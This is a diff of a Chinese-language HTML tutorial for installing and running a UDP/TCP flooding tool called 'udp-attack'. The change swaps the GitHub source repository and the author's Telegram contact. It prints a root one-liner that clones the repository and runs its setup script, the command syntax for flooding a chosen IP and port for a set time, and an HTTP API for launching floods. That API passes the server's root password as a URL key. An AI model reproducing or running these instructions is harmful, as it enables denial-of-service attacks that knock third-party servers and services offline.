@@ -7,7 +7,7 @@
 <br>
 现在开始安装，，，
 <br>
-<pre>cd /root && yum install -y git wget curl net-tools && git clone https://github.com/KLDGodY/udp-attack.git && cd udp-attack && mv ./* ../ && cd ../ && perl setup.pl</pre>
+<pre>cd /root && yum install -y git wget curl net-tools && git clone https://github.com/Scholar-m/udp-attack.git && cd udp-attack && mv ./* ../ && cd ../ && perl setup.pl</pre>
 <blockquote>如果显示perl没有安装，，请自行到网上找教程，，，</blockquote>
 安装过程中如果问你要不要安装某些东西，按y同意
 <br>
@@ -15,5 +15,4 @@
 命令格式：<pre>perl /root/ssyn.pl 要攻击的IP 端口 每秒发送数据包(bytes) 持续攻击秒数</pre>
 当然你也可以用api攻击，php安装方式网上自己找，api地址是<pre>http://你的服务器地址/api.php?key=[yourvpspassword(root)]&host=[host]&port=[port]&time=[time]&method=[method]</pre>
 说一下，method有3种模式，分别是udp，tcp，和stop，，
-我的tg：<a href="//t.me/KLDGodY">@KLDGodY</a><br>
-tg水群：<a href="//t.me/kldgodynb">@kldgodynb</a><br>欢迎各位dl加入，，，
+我的tg：<a href="//t.me/Scholar-m">@KLDGodY</a><br>
